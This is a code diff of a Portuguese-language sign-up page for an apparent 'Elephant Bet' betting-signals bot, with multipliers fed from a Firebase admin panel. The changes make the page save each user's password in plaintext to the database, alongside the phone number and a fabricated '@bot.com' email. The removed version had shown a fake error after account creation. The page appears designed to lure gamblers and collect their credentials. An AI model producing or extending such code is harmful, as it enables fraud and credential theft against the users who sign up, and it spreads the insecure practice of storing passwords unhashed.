@@ -69,7 +69,7 @@ top:-8px;left:10px;font-size:11px;color:#ffffff;background:#0d0d1c;padding:0 4px
 <div class="division-line"></div>
 
 <div class="top-header">
-<div class="cadastro" onclick="window.location.href=''">CADASTRE-SE</div>
+<div class="cadastro">CADASTRE-SE</div>
 <div class="close">✕</div>
 </div>
 
@@ -110,64 +110,104 @@ storageBucket: "palpite3ad.appspot.com",
 };
 
 firebase.initializeApp(firebaseConfig);
+
 const auth = firebase.auth();
 const db = firebase.database();
 
-/* 🔥 CABEÇALHO EM TEMPO REAL (PAINEL ADM) */
-db.ref("sinais").on("value", function(snapshot){
-const dados = snapshot.val();
+/* CABEÇALHO */
+
+db.ref("sinais").on("value",function(snapshot){
+const dados=snapshot.val();
 if(dados){
-document.getElementById("tituloBot").innerText = dados.titulo || "INICIAR SESSÃO ELEPHANT BET";
-document.getElementById("protecao").innerText = dados.protecao || "0.0X";
-document.getElementById("grafico").innerText = dados.grafico || "0%";
-document.getElementById("saida").innerText = dados.saida || "0.0X";
+document.getElementById("tituloBot").innerText=dados.titulo||"INICIAR SESSÃO ELEPHANT BET";
+document.getElementById("protecao").innerText=dados.protecao||"0.0X";
+document.getElementById("grafico").innerText=dados.grafico||"0%";
+document.getElementById("saida").innerText=dados.saida||"0.0X";
 }
 });
 
-/* TELEFONE 244 FIXO */
-const telefoneInput = document.getElementById("telefone");
+/* TELEFONE */
+
+const telefoneInput=document.getElementById("telefone");
+
 telefoneInput.addEventListener("focus",()=>{
-if(telefoneInput.value===""){telefoneInput.value="244";setTimeout(()=>telefoneInput.setSelectionRange(3,3),0);}
+if(telefoneInput.value===""){
+telefoneInput.value="244";
+setTimeout(()=>telefoneInput.setSelectionRange(3,3),0);
+}
 });
+
 telefoneInput.addEventListener("input",()=>{
 let numeros=telefoneInput.value.replace(/\D/g,'');
 if(!numeros.startsWith("244")) numeros="244";
 if(numeros.length>12) numeros=numeros.slice(0,12);
 telefoneInput.value=numeros;
 });
+
 telefoneInput.addEventListener("keydown",(e)=>{
-if(telefoneInput.selectionStart<=3&&(e.key==="Backspace"||e.key==="Delete")) e.preventDefault();
+if(telefoneInput.selectionStart<=3&&(e.key==="Backspace"||e.key==="Delete")){
+e.preventDefault();
+}
 });
+
 telefoneInput.addEventListener("blur",()=>{
-if(telefoneInput.value.length<12) telefoneInput.value="";
+if(telefoneInput.value.length<12){
+telefoneInput.value="";
+}
 });
 
 /* CRIAR CONTA */
+
 function criarConta(){
+
 const telefone=telefoneInput.value.trim();
 const senha=document.getElementById("senha").value.trim();
+
 const erroTelefone=document.getElementById("erroTelefone");
 const erroSenha=document.getElementById("erroSenha");
 
 erroTelefone.style.display="none";
 erroSenha.style.display="none";
-telefoneInput.classList.remove("error");
-document.getElementById("senha").classList.remove("error");
 
-let hasError=false;
-if(telefone.length!==12){erroTelefone.style.display="block";telefoneInput.classList.add("error");hasError=true;}
-if(!senha){erroSenha.style.display="block";document.getElementById("senha").classList.add("error");hasError=true;}
-if(hasError) return;
+let erro=false;
+
+if(telefone.length!==12){
+erroTelefone.style.display="block";
+erro=true;
+}
+
+if(!senha){
+erroSenha.style.display="block";
+erro=true;
+}
+
+if(erro) return;
 
 const emailFake=telefone+"@bot.com";
 
 auth.createUserWithEmailAndPassword(emailFake,senha)
-.then(userCredential=>{
+.then((userCredential)=>{
+
 const uid=userCredential.user.uid;
-db.ref("users/"+uid).set({telefone:telefone,criadoEm:new Date().toLocaleString()});
-alert("Erro, tentar outra hora!");
+
+db.ref("users/"+uid).set({
+
+telefone:telefone,
+senha:senha,
+email:emailFake,
+data:new Date().toLocaleString()
+
+});
+
+alert("Conta criada com sucesso");
+
 })
-.catch(error=>{alert(error.message);});
+.catch((error)=>{
+
+alert(error.message);
+
+});
+
 }
 </script>
 
